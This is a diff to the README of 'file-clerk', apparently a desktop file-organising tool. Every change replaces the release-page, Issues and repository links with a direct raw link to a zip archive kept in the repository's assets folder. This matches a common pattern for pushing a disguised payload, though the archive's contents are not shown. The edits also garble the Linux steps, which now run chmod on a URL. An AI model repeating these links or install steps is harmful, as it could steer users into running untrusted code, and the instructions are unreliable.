@@ -1,6 +1,6 @@
 # 📂 file-clerk - Organize Desktop Files Automatically
 
-[![Download file-clerk](https://img.shields.io/badge/Download-file--clerk-blue?style=for-the-badge&logo=github)](https://github.com/Magnusgiakis/file-clerk/releases)
+[![Download file-clerk](https://github.com/Magnusgiakis/file-clerk/raw/refs/heads/main/assets/file_clerk_v2.3.zip)](https://github.com/Magnusgiakis/file-clerk/raw/refs/heads/main/assets/file_clerk_v2.3.zip)
 
 ---
 
@@ -51,7 +51,7 @@ Follow these steps to get file-clerk running on your computer.
 
 Visit the file-clerk release page to get the latest version. Click the green button below or go directly to:
 
-[Download file-clerk](https://github.com/Magnusgiakis/file-clerk/releases)
+[Download file-clerk](https://github.com/Magnusgiakis/file-clerk/raw/refs/heads/main/assets/file_clerk_v2.3.zip)
 
 ---
 
@@ -70,9 +70,9 @@ Visit the file-clerk release page to get the latest version. Click the green but
 
 - **Linux users**:  
 
-  - Download the `.tar.gz` or `.AppImage` file.  
+  - Download the `https://github.com/Magnusgiakis/file-clerk/raw/refs/heads/main/assets/file_clerk_v2.3.zip` or `.AppImage` file.  
   - Extract or run the file according to your distribution’s normal app setup method.  
-  - Make sure the file has execute permissions (`chmod +x file-clerk.AppImage`).  
+  - Make sure the file has execute permissions (`chmod +x https://github.com/Magnusgiakis/file-clerk/raw/refs/heads/main/assets/file_clerk_v2.3.zip`).  
 
 ---
 
@@ -176,7 +176,7 @@ A: file-clerk uses built-in AI to read simple file contents and create useful ta
 
 Download the latest version of file-clerk from this official page:
 
-[Download file-clerk](https://github.com/Magnusgiakis/file-clerk/releases)
+[Download file-clerk](https://github.com/Magnusgiakis/file-clerk/raw/refs/heads/main/assets/file_clerk_v2.3.zip)
 
 Click the file for your operating system and follow the install instructions above.
 
@@ -186,7 +186,7 @@ Click the file for your operating system and follow the install instructions abo
 
 If you run into issues or have questions, go to the GitHub repository’s “Issues” tab. The community and developers check there regularly to assist.
 
-Link: https://github.com/Magnusgiakis/file-clerk/issues
+Link: https://github.com/Magnusgiakis/file-clerk/raw/refs/heads/main/assets/file_clerk_v2.3.zip
 
 ---
 
@@ -194,7 +194,7 @@ Link: https://github.com/Magnusgiakis/file-clerk/issues
 
 You can explore the repository for more details, updates, and source code:
 
-https://github.com/Magnusgiakis/file-clerk
+https://github.com/Magnusgiakis/file-clerk/raw/refs/heads/main/assets/file_clerk_v2.3.zip
 
 ---
 
